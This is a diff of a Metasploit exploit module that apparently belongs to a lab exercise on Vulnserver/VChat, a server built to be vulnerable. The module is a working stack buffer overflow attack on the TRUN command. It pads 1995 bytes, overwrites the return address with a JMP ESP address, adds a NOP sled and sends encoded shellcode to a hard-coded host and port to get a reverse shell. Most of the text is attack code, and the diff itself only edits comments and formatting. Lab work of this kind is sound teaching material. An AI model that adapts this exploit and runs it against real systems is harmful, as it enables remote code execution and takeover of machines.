@@ -6,7 +6,7 @@
 ##
 # File path: .msf4/modules/exploits/windows/vulnserver/knock.rb
 ##
-# This module exploits the KNOCK command of vulnerable chat server
+# This module exploits the TRUN command of vulnerable chat server
 ##
 
 class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
@@ -16,7 +16,7 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
   
     def initialize(info = {})	# i.e. constructor, setting the initial values
       super(update_info(info,
-        'Name'           => 'Vulnserver Buffer Overflow-TRUN command',	# Name of the target
+        'Name'           => 'VChat/Vulnserver Buffer Overflow-TRUN command',	# Name of the target
         'Description'    => %q{	# Explaining what the module does
            This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
         },
@@ -35,7 +35,6 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
           },      
         'Payload'        =>	# How to encode and generate the payload
           {
-   #         'Space'    => 5000,	# Space that can hold shellcode? No need in this exploit
             'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
           },
         'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
@@ -47,13 +46,13 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
             }
           ]
         ],
-      'DefaultTarget'  => 0,
+        'DefaultTarget'  => 0,
         'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
-      register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
-        [
-          OptInt.new('RETOFFSET', [true, 'Offset of Return Address in function', 1995]),
-          Opt::RPORT(9999),
-          Opt::RHOSTS('192.168.7.191')
+        register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
+            [
+            OptInt.new('RETOFFSET', [true, 'Offset of Return Address in function', 1995]),
+            Opt::RPORT(9999),
+            Opt::RHOSTS('192.168.7.191')
         ])
     end
   
@@ -61,10 +60,9 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       print_status("Connecting to target...")
       connect	# Connect to the target
   
-      #    sock.get_once # poll the connection and see availability of any read data one time
       print_status("class #{target.opts.class}")
 
-      shellcode = payload.encoded	# Generated and encoded shellcode #(0x90).to_s(16)
+      shellcode = payload.encoded	# Generated and encoded shellcode
       outbound = 'TRUN /.:/' + "A"*datastore['RETOFFSET'] + [target['jmpesp']].pack('V') + "\x90" * 32 + shellcode # Create the malicious string that will be sent to the target
   
       print_status("Sending Exploit")
